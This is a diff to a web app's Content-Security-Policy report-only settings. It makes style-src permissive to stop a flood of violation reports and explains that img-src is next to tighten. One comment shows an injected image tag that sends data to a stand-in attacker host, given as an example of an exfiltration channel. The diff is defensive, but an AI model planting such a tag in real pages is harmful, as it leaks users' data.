@@ -664,18 +664,33 @@ CSP_REPORT_ONLY = (
     # except for report-uri, so it reported on rules already in force and
     # collected nothing actionable.
     #
-    # style-src 'self' IS NOW ENFORCED, so reporting on it again would collect
-    # nothing -- the same trap this header fell into before.
+    # style-src is DELIBERATELY OMITTED from this policy.
     #
-    # The next ratchet is img-src. The enforcing policy allows `https:`, i.e.
-    # ANY https origin, which is the last directive that still permits a
-    # request to leave the machine: an injected <img src="https://attacker/?d=">
-    # is a working exfiltration channel even with script-src 'self'. Every
-    # image the app itself loads is same-origin, a data: URI or a blob: (the
-    # generator's output), so `https:` is very likely dead weight -- but it is
-    # measured here first rather than assumed, because getting it wrong breaks
-    # avatars and any user-pasted image URL.
-    "style-src 'self'; "
+    # It is already enforced, and 00-style-hydrate.js re-applies each refused
+    # attribute through the CSSOM. The parser still refuses first -- that is the
+    # mechanism -- so listing style-src here made the browser POST a violation
+    # report for every one of ~660 style attributes on every page load.
+    #
+    # Measured before this change: 775 requests on a single load, 662 of them
+    # to /api/security/csp-report. 86% of all load traffic, reporting a rule
+    # that is both in force and already handled. Exactly the trap the comment
+    # above warns about.
+    #
+    # The live ratchet is img-src. The enforcing policy allows `https:`, i.e.
+    # ANY https origin -- the last directive that still lets a request leave the
+    # machine, so an injected <img src="https://attacker/?d="> is a working
+    # exfiltration channel even under script-src 'self'. Every image the app
+    # loads is same-origin, data: or blob:, so `https:` is very likely dead
+    # weight; it is measured here rather than assumed, because getting it wrong
+    # breaks avatars and any user-pasted image URL.
+    #
+    # style-src MUST be listed explicitly as permissive, not merely omitted.
+    # Omitting it falls back to `default-src 'self'`, which still governs
+    # styles -- so dropping the line changed nothing and the 662 reports kept
+    # firing. Verified against the live header. 'unsafe-inline' here mirrors
+    # what the hydrator makes true in practice and silences the noise, while
+    # the ENFORCING policy keeps style-src locked down.
+    "style-src 'self' 'unsafe-inline'; "
     "font-src 'self' data:; "
     "img-src 'self' data: blob:; "
     "connect-src 'self' blob: ws: wss: http://127.0.0.1:* http://localhost:*; "
